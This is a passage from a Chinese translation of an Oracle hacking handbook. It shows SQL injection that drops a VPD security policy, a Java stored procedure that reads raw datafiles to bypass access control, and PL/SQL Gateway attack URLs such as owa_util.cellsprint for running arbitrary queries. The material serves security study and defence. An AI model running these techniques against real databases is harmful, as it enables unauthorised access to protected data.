class="line">SQL&gt;</span><br></pre></td></tr></table></figure>

<p>现在我们可以再次访问SECRECY订单。 那么这里发生了什么？ XDB_PITRIG_PKG 包的 PITRIG_DROP 过程容易受到 SQL 注入的影响，并且由于该包可由 PUBLIC 执行，因此任何人都可以作为 XDB 执行 SQL。 我们创建了一个名为 F 的函数，它执行以下操作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line"></span><br><span class="line">SYS.DBMS_RLS.DROP_POLICY(&#x27;VPD&#x27;,&#x27;VPDTESTTABLE&#x27;,&#x27;SECRECY&#x27;);</span><br><span class="line"></span><br><span class="line">END;</span><br></pre></td></tr></table></figure>

<p>这会从 VPDTESTTABLE 中删除 SECRECY 策略。 然后我们将此函数注入到 XDB_PITRIG_PKG.PITRIG_DROP 中，它以 XDB 权限执行，从而删除策略并让我们再次访问秘密数据。 此外，创建 FOO 表并将其保留为空以停止“ORA-31007：尝试删除非空容器”错误，如果我们使用例如 SCOTT.EMP，我们会得到该错误。 坦率地说，SYS 拥有的定义者权限包中的任何 SQL 注入缺陷都会同样有效 - 但这一点已经得到了解决。 如果您不知道 VPDTESTTABLE 上的策略名称，则可以从 ALL_POLICIES 视图中获取此信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select OBJECT_OWNER, OBJECT_NAME, POLICY_NAME FROM ALL_POLICIES;</span><br><span class="line"></span><br><span class="line">OBJECT_OWNER      OBJECT_NAME            POLICY_NAME</span><br><span class="line">------------       -----------            -------------</span><br><span class="line">VPD               VPDTESTTABLE              SECRECY</span><br></pre></td></tr></table></figure>

<h3 id="使用原始文件访问攻击VPD"><a href="#使用原始文件访问攻击VPD" class="headerlink" title="使用原始文件访问攻击VPD"></a>使用原始文件访问攻击VPD</h3><p>您可以通过访问原始数据文件本身来完全绕过数据库强制访问控制。 这在第 11 章中有完整的介绍——但现在是代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">SET ESCAPE ON</span><br><span class="line">SET ESCAPE &quot;\&quot;</span><br><span class="line">SET SERVEROUTPUT ON</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVAREADBINFILE&quot; AS</span><br><span class="line">import java.lang.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class JAVAREADBINFILE</span><br><span class="line">&#123;</span><br><span class="line">        public static void readbinfile(String f, int start) throws</span><br><span class="line">IOException</span><br><span class="line">      &#123;</span><br><span class="line">             FileInputStream fis;</span><br><span class="line">            DataInputStream dis;</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                  int i;</span><br><span class="line">                  int ih,il;</span><br><span class="line">                  int cnt = 1, h=0,l=0;</span><br><span class="line">                  String hex[] = &#123;&quot;0&quot;, &quot;1&quot;, &quot;2&quot;,&quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;,</span><br><span class="line">&quot;8&quot;,&quot;9&quot;, &quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;, &quot;E&quot;,&quot; F&quot;&#125;;</span><br><span class="line"></span><br><span class="line">                  RandomAccessFile raf = new RandomAccessFile (f, &quot;r&quot;);</span><br><span class="line">                  raf.seek (start);</span><br><span class="line">                  for(i=0; i&lt;=512; i++)</span><br><span class="line">                  &#123;</span><br><span class="line">                        ih = il = raf.readByte() \&amp; 0xFF;</span><br><span class="line">                        h = ih &gt;&gt; 4;</span><br><span class="line"></span><br><span class="line">                           l = il \&amp; 0x0F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                           System.out.print(&quot;\\\\x&quot; + hex[h] + hex[l]);</span><br><span class="line">                           if(cnt \% 16 == 0)</span><br><span class="line">                                 System.out.println();</span><br><span class="line">                           cnt ++;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">             catch (EOFException eof)</span><br><span class="line">                   &#123;</span><br><span class="line">                   System.out.println();</span><br><span class="line">                   System.out.println(&quot;EOF reached &quot;);</span><br><span class="line">             &#125;</span><br><span class="line">             catch (IOException ioe)</span><br><span class="line">             &#123;</span><br><span class="line">                   System.out.println(&quot;IO error: &quot;+ ioe);</span><br><span class="line">             &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">/</span><br><span class="line">show errors</span><br><span class="line">/</span><br><span class="line">CREATE OR REPLACE PROCEDURE JAVAREADBINFILEPROC (p_filename  IN</span><br><span class="line">VARCHAR2, p_start in number)</span><br><span class="line">AS LANGUAGE JAVA</span><br><span class="line">NAME &#x27;JAVAREADBINFILE.readbinfile (java.lang.String, int)&#x27;;</span><br><span class="line">/</span><br><span class="line">show errors</span><br><span class="line">/</span><br></pre></td></tr></table></figure>

<p>创建后，您可以使用它直接读取文件 - 在这种情况下， VPDTESTTABLE 存在于 USERS 表空间中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; set serveroutput on</span><br><span class="line">SQL&gt; exec dbms_java.set_output(2000);</span><br><span class="line">PL/SQL procedure successfully completed.</span><br><span class="line">SQL&gt; exec</span><br><span class="line">JAVAREADBINFILEPROC(&#x27;c:\\oracle\\oradata\\orcl10G\\USERS01.DBF&#x27;,3129184)</span><br><span class="line">;</span><br><span class="line">\x03\x1B\x01\x80\x02\x02\x2C\x01\x03\x0C\x55\x4E\x43\x4C\x41\x53</span><br><span class="line">\x53\x49\x46\x49\x45\x44\x0C\x50\x4F\x4C\x49\x53\x48\x20\x42\x4F</span><br><span class="line">\x4F\x54\x53\x05\x4D\x41\x4A\x4F\x52\x2C\x01\x03\x06\x53\x45\x43</span><br><span class="line">\x52\x45\x54\x11\x49\x4E\x56\x41\x44\x45\x20\x4F\x4E\x20\x54\x55</span><br><span class="line">\x45\x53\x44\x41\x59\x07\x43\x4F\x4C\x4F\x4E\x45\x4C\x2C\x01\x03</span><br><span class="line">\x0C\x55\x4E\x43\x4C\x41\x53\x53\x49\x46\x49\x45\x44\x10\x55\x50</span><br><span class="line"></span><br><span class="line">\x44\x41\x54\x45\x20\x44\x55\x54\x59\x20\x52\x4F\x54\x41\x08\x43</span><br><span class="line">\x4F\x52\x50\x4F\x52\x41\x4C\x2C\x01\x03\x06\x53\x45\x43\x52\x45</span><br><span class="line">\x54\x12\x43\x41\x50\x54\x55\x52\x45\x20\x45\x4E\x45\x4D\x59\x20</span><br><span class="line">\x42\x41\x53\x45\x07\x47\x45\x4E\x45\x52\x41\x4C\x06\x06\x1E\xE2</span><br><span class="line">\x06\xA2\x00\x00\x7E\x01\x00\x01\x1E\xE2\x1F\x00\x00\x00\x01\x04</span><br><span class="line">\xBE\x1E\x00\x00\x01\x00\x0B\x00\x17\xCB\x00\x00\x01\xE2\x1F\x00</span><br><span class="line">..</span><br><span class="line">..</span><br></pre></td></tr></table></figure>

<p>PL/SQL 过程成功完成。 此输出包含加密数据 - 例如，从第 3 行的最后三个字节开始，我们有以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\x53\x45\x43\x52\x45\x54\x11\x49\x4E\x56\x41\x44\x45</span><br><span class="line">S   E   C   R   E   T       I   N   V   A   D   E</span><br><span class="line">\x20\x4F\x4E\x20\x54\x55\x45\x53\x44\x41\x59</span><br><span class="line">    O   N       T   U   E   S   D   A   Y</span><br></pre></td></tr></table></figure>

<h3 id="一般特权"><a href="#一般特权" class="headerlink" title="一般特权"></a>一般特权</h3><p>我已经看到许多服务器已授予 PUBLIC DBMS_RLS 的执行权限，以及一些关于虚拟专用数据库的教程也是如此。 这不是一个好主意。 还有其他包应该有PUBLIC的执行权限，比如SYS.LTADM，它有一个叫做CREATERLSPOLICY的过程，直接调用DBMS_RLS.ADD_POLICY过程。 DBMS_FGA 显然是另一个。 WKSYS 拥有的 WK_ADM 可由 PUBLIC 执行并允许对策略进行有限的修改。</p>
<p>最后，如果有人可以授予自己 EXEMPT ACCESS POLICY 系统特权 - 例如，通过 SQL 注入缺陷 - 那么策略将不适用于他们。</p>
<h2 id="攻击Oracle-PL-SQL-Web应用程序"><a href="#攻击Oracle-PL-SQL-Web应用程序" class="headerlink" title="攻击Oracle PL/SQL Web应用程序"></a>攻击Oracle PL/SQL Web应用程序</h2><p>Oracle PL/SQL 网关提供了通过 Web 在 Oracle 数据库服务器中执行 PL/SQL 过程的能力。 它提供了一个网关，即从 Internet 到 Web 上的后端 Oracle 数据库服务器的路径。 当用户使用 Web 浏览器连接到运行 Oracle PL/SQL 网关的 Web 服务器时，网关只是将用户的请求代理到执行请求的数据库服务器。 Oracle PL/SQL 网关内置于 Oracle 门户、Oracle 应用程序、服务器和 Oracle HTTP 服务器。</p>
<p><img src="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/10.png"></p>
<h3 id="认识Oracle-PL-SQL网关"><a href="#认识Oracle-PL-SQL网关" class="headerlink" title="认识Oracle PL/SQL网关"></a>认识Oracle PL/SQL网关</h3><p><strong>PL/SQL 网关 URL</strong></p>
<p>PL/SQL Web 应用程序的 URL 通常很容易识别，并且通常以以下开头（xyz 可以是任何字符串并表示数据库访问描述符，稍后您将了解更多信息）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/xyz</span><br><span class="line">http://server.example.com/xyz/owa</span><br><span class="line">http://server.example.com/xyz/plsql</span><br></pre></td></tr></table></figure>

<p>虽然这些示例中的第二个和第三个表示来自旧版本 PL/SQL 网关的 URL，但第一个来自在 Apache 上运行的更新版本。 在 plsql.conf Apache 配置文件中，/pls 是默认值，指定为一个位置，PLS 模块作为处理程序。 但是，位置不必是 /pls。 URL 中缺少文件扩展名可能表明存在 Oracle PL/SQL 网关。 考虑以下 URL：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/aaa/bbb/xxxxx.yyyyy</span><br></pre></td></tr></table></figure>

<p>如果 xxxxx.yyyyy 被替换为类似于“ebank.home”、“store.welcome”、“auth.login”或“books.search”的内容，那么 PL/SQL 网关很有可能是 正在使用。 您可以执行一些简单的测试来验证这一点，但在查看这些之前，让我们充分探索 URL 语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/pls/xyz/pkg.proc</span><br></pre></td></tr></table></figure>

<p>在此 URL 中，xyz 是数据库访问描述符或 DAD。 DAD 指定有关数据库服务器的信息，以便 PL/SQL 网关可以连接。 它包含诸如 TNS 连接字符串、用户 ID 和密码、身份验证方法等信息。 这些 DAD 在更新版本中的 dads.conf Apache 配置文件或旧版本中的 wdbsvr.app 文件中指定。 一些默认 DAD 包括以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ORASSO</span><br><span class="line">PORTAL</span><br><span class="line">SIMPLEDAD</span><br><span class="line">SSODAD</span><br></pre></td></tr></table></figure>

<p>上面显示的URL中的pkg是存储在后端数据库服务器中的PL/SQL包的名称，proc是包导出的过程。 将 PL/SQL 包视为存在于 Oracle 数据库服务器中的程序的最佳方式，每个过程都公开了一些可以调用的功能。 例如，您可以编写一个 Calculator PL/SQL 包。 该包将被称为 CALC，它将具有调用 ADD、SUBTRACT、DIVIDE 和 MULTIPLY 的过程。 然后您可以通过 PL/SQL 网关执行这些过程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/pls/xyz/calc.add?x1=10&amp;y=20</span><br></pre></td></tr></table></figure>

<p>CALC包的源码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">-- CALC PL/SQL Package</span><br><span class="line">-- create the package specification</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE PACKAGE CALC IS</span><br><span class="line">      PROCEDURE ADD(X NUMBER, Y NUMBER);</span><br><span class="line">      PROCEDURE SUBTRACT(X NUMBER, Y NUMBER);</span><br><span class="line">      PROCEDURE DIVIDE(X NUMBER, Y NUMBER);</span><br><span class="line">      PROCEDURE MULTIPLY(X NUMBER, Y NUMBER);</span><br><span class="line">END CALC;</span><br><span class="line">/</span><br><span class="line">-- create package&#x27;s body</span><br><span class="line">CREATE OR REPLACE PACKAGE BODY CALC IS</span><br><span class="line">      PROCEDURE ADD(X NUMBER, Y NUMBER) IS</span><br><span class="line">      BEGIN</span><br><span class="line">            HTP.PRINT(X + Y);</span><br><span class="line">      END ADD;</span><br><span class="line">      PROCEDURE SUBTRACT(X NUMBER, Y NUMBER) IS</span><br><span class="line">      BEGIN</span><br><span class="line">            HTP.PRINT(X - Y);</span><br><span class="line">      END SUBTRACT;</span><br><span class="line">      PROCEDURE DIVIDE(X NUMBER, Y NUMBER) IS</span><br><span class="line">      BEGIN</span><br><span class="line">            HTP.PRINT(X / Y);</span><br><span class="line">      END DIVIDE;</span><br><span class="line">      PROCEDURE MULTIPLY(X NUMBER, Y NUMBER) IS</span><br><span class="line">      BEGIN</span><br><span class="line">            HTP.PRINT(X * Y);</span><br><span class="line">      END MULTIPLY;</span><br><span class="line">END CALC;</span><br><span class="line">/</span><br><span class="line">GRANT EXECUTE ON CALC TO PUBLIC;</span><br></pre></td></tr></table></figure>

<p>这提出了一个有趣的观点：由于 CALC 包可能存在于许多模式中的任何一个模式中，网关如何“知道”去哪里查找？ 在 DAD 中指定的用户名通常表示模式，但请记住在开篇章节中网关就是这样：进入数据库的网关。 如果我们指定不同的模式，我们可以访问其他包。 假设 SCOTT 创建了 CALC 包，我们可以访问它——即使 DAD 中指定的模式是 FOO：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/pls/xyz/SCOTT.calc.add?x1=10&amp;y=20</span><br></pre></td></tr></table></figure>

<p>这是 Oracle PL/SQL 网关的主要弱点之一。</p>
<p><strong>Oracle门户</strong></p>
<p>Oracle 门户应用程序构建在 Oracle PL/SQL 网关之上。 如果您看到类似的 URL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/portal/page?_pageid=number&amp;_dad=portal&amp;_schema</span><br><span class="line">=PORTAL</span><br></pre></td></tr></table></figure>

<p>然后服务器正在运行的网关。 将上述门户 URL 转换为网关 URL 需要您采用 dad 参数并将其附加到 /pls：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/portal/null</span><br></pre></td></tr></table></figure>

<h3 id="验证Oracle-PL-SQL网关是否存在"><a href="#验证Oracle-PL-SQL网关是否存在" class="headerlink" title="验证Oracle PL/SQL网关是否存在"></a>验证Oracle PL/SQL网关是否存在</h3><p>有时，应用程序使用 Oracle PL/SQL 网关可能并不明显。 本节介绍了一些可用于测试的方法。</p>
<p><strong>Web 服务器 HTTP 服务器响应头</strong></p>
<p>通过获取 HTTP Server 响应头，您通常可以判断 PL/SQL 网关是否存在。 以下是您可能会看到的一些有效回复：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Oracle-Application-Server-10g</span><br><span class="line">Oracle-Application-Server-10g/10.1.2.0.0 Oracle-HTTP-Server</span><br><span class="line">Oracle-Application-Server-10g/9.0.4.1.0 Oracle-HTTP-Server</span><br><span class="line">Oracle-Application-Server-10g OracleAS-Web-Cache-10g/9.0.4.2.0 (N)</span><br><span class="line">Oracle-Application-Server-10g/9.0.4.0.0</span><br><span class="line"></span><br><span class="line">Oracle HTTP Server Powered by Apache</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3a</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.19 (Unix) mod_plsql/3.0.9.8.3d</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.12 (Unix) mod_plsql/3.0.9.8.5e</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.12 (Win32) mod_plsql/3.0.9.8.5e</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.19 (Win32) mod_plsql/3.0.9.8.3c</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/3.0.9.8.3b</span><br><span class="line">Oracle HTTP Server Powered by Apache/1.3.22 (Unix) mod_plsql/9.0.2.0.0</span><br><span class="line"></span><br><span class="line">Oracle_Web_Listener/4.0.7.1.0EnterpriseEdition</span><br><span class="line">Oracle_Web_Listener/4.0.8.2EnterpriseEdition</span><br><span class="line">Oracle_Web_Listener/4.0.8.1.0EnterpriseEdition</span><br><span class="line">Oracle_Web_listener3.0.2.0.0/2.14FC1</span><br><span class="line"></span><br><span class="line">Oracle9iAS/9.0.2 Oracle HTTP Server</span><br><span class="line">Oracle9iAS/9.0.3.1 Oracle HTTP Server</span><br></pre></td></tr></table></figure>

<p>这些是通过搜索“inurl:plsql oracle”和“inurl:owa oracle”从谷歌上发现的服务器中获取的。</p>
<p>如果您不确定某个应用程序是否正在使用 Oracle PL/SQL 网关，您可以针对该信息执行一些快速测试。 如果应用程序正在使用网关，那么将过程设置为 NULL 应该会导致 Web 服务器返回一个空的 200 响应：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/pls/dad/null</span><br></pre></td></tr></table></figure>

<p>发生这种情况是因为 PL/SQL 中的 NULL 相当于无操作； 如果你得到一个空正文的 200 响应，你可以推断无操作成功完成。</p>
<p>在网关的更高版本中，请求 OWA_UTIL.SIGNATURE 作为过程应该导致 403 Forbidden 响应：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server/pls/dad/owa_util.signature</span><br></pre></td></tr></table></figure>

<p>在这里，我们收到了禁止响应，因为此过程存在安全风险，并且 Oracle Portal 默认阻止对其进行访问。 如果您正在处理 Oracle Portal 的早期版本，从而可以获得对 OWA_UTIL 的访问，那么您应该得到类似于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;This page was produced by the PL/SQL Web Toolkit on date&quot;</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;This page was produced by the PL/SQL Cartridge on date&quot;</span><br></pre></td></tr></table></figure>

<p><strong>Oracle PL/SQL 网关如何与数据库服务器通信</strong></p>
<p>使用 SQL*Plus 等标准客户端，普通用户可以执行 PL/SQL 过程，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; exec package.procedure(&#x27;foo&#x27;);</span><br></pre></td></tr></table></figure>

<p>或者，用户可以在匿名 PL/SQL 块中执行该过程，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; declare</span><br><span class="line">buff varchar2(20):=&#x27;foo&#x27;;</span><br><span class="line">begin</span><br><span class="line">package.procedure(buff);</span><br><span class="line">end;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>

<p>PL/SQL 网关本质上做同样的事情。 它采用用户请求的包和过程的名称，并将其嵌入到 PL/SQL 的匿名块中，将其发送到数据库服务器以供执行。 随着时间的推移，匿名 PL/SQL 块的确切内容发生了变化，但如果我们请求 <a target="_blank" rel="external nofollow noopener noreferrer" href="http://server/pls/dad/foo.bar?xyz=123%EF%BC%8C%E5%AE%83%E7%9C%8B%E8%B5%B7%E6%9D%A5%E5%83%8F%E8%BF%99%E6%A0%B7%EF%BC%9A">http://server/pls/dad/foo.bar?xyz=123，它看起来像这样：</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">1 declare</span><br><span class="line">2  rc__ number;</span><br><span class="line">3  start_time__ binary_integer;</span><br><span class="line">4  simple_list__ owa_util.vc_arr;</span><br><span class="line">5  complex_list__ owa_util.vc_arr;</span><br><span class="line">6 begin</span><br><span class="line">7  start_time__ := dbms_utility.get_time;</span><br><span class="line"></span><br><span class="line">8  owa.init_cgi_env(:n__,:nm__,:v__);</span><br><span class="line">9  htp.HTBUF_LEN := 255;</span><br><span class="line">10  null;</span><br><span class="line">11  null;</span><br><span class="line">12  simple_list__(1) := &#x27;sys.%&#x27;;</span><br><span class="line">13  simple_list__(2) := &#x27;dbms\_%&#x27;;</span><br><span class="line">14  simple_list__(3) := &#x27;utl\_%&#x27;;</span><br><span class="line">15  simple_list__(4) := &#x27;owa\_%&#x27;;</span><br><span class="line">16  simple_list__(5) := &#x27;owa.%&#x27;;</span><br><span class="line">17  simple_list__(6) := &#x27;htp.%&#x27;;</span><br><span class="line">18  simple_list__(7) := &#x27;htf.%&#x27;;</span><br><span class="line">19  if ((owa_match.match_pattern(&#x27;foo.bar&#x27;, simple_list__,</span><br><span class="line">complex_list__, true))) then</span><br><span class="line">20   rc__ := 2;</span><br><span class="line">21  else</span><br><span class="line">22   null;</span><br><span class="line">23   orasso.wpg_session.init();</span><br><span class="line">24   foo.bar(XYZ=&gt;:XYZ);</span><br><span class="line">25   if (wpg_docload.is_file_download) then</span><br><span class="line">26    rc__ := 1;</span><br><span class="line">27    wpg_docload.get_download_file(:doc_info);</span><br><span class="line">28    orasso.wpg_session.deinit();</span><br><span class="line">29    null;</span><br><span class="line">30    null;</span><br><span class="line">31    commit;</span><br><span class="line">32   else</span><br><span class="line">33    rc__ := 0;</span><br><span class="line">34    orasso.wpg_session.deinit();</span><br><span class="line">35    null;</span><br><span class="line">36    null;</span><br><span class="line">37    commit;</span><br><span class="line">38    owa.get_page(:data__,:ndata__);</span><br><span class="line">39   end if;</span><br><span class="line">40  end if;</span><br><span class="line">41  :rc__ := rc__;</span><br><span class="line">42  :db_proc_time__ := dbms_utility.get_time - start_time__;</span><br><span class="line">43 end;</span><br></pre></td></tr></table></figure>

<p>需要注意的关键行是 19 和 24。在第 19 行，根据已知的“坏”字符串列表检查用户的请求。 这构成了 PL/SQL 排除列表的一部分，稍后您将了解更多信息。 如果用户请求的包和过程不包含坏字符串，则过程在第 24 行执行。XYZ 参数作为绑定变量传递。 稍后您将学习如何操作您的请求，以便您可以在这个匿名块中嵌入任意 PL/SQL - 从而获得对其执行的后端数据库服务器的完全控制。</p>
<h3 id="攻击PL-SQL网关"><a href="#攻击PL-SQL网关" class="headerlink" title="攻击PL/SQL网关"></a>攻击PL/SQL网关</h3><p>本节着眼于攻击 PL/SQL 网关的方法。 完成此操作的方式取决于补丁级别。 并提供了对 Oracle 修补安全漏洞的方法的深入了解。</p>
<p><strong>PL/SQL 排除列表</strong></p>
<p>之前您看到了如何通过指定包所在的架构来访问任何过程（取决于权限）。 这存在明显的安全风险。 为了阻止这种风险，Oracle 引入了 PL/SQL ExclusionList。 此列表最初包含许多已知的错误字符串，这些字符串可能出现在攻击者发出的请求中。 该列表包含以下条目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">OWA*</span><br><span class="line">SYS.*</span><br><span class="line">DBMS_*</span><br><span class="line">HTP.*</span><br><span class="line">HTF.*</span><br><span class="line">UTL_*</span><br></pre></td></tr></table></figure>

<p>由于这些攻击都存在已知的攻击，Oracle 希望阻止访问名称与这些条件匹配的包。 在过去的五年中，一些漏洞允许攻击者绕过 PL/SQL 排除列表并访问这些包。 例如，考虑 SYS 拥有的 OWA_UTIL 包。 这个包包含一个叫做 CELLSPRINT 的过程，它使攻击者能够运行任意 SELECT 查询。 在没有排除列表的服务器中，可以按如下方式执行查询：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/owa_util.cellsprint?p_thequery=select+1+from+dual</span><br></pre></td></tr></table></figure>

<p>添加排除列表后，直接尝试访问此包将导致“403 Forbidden”响应。 但是，可以通过在包之前放置换行符来轻松绕过第一个补丁：</p>
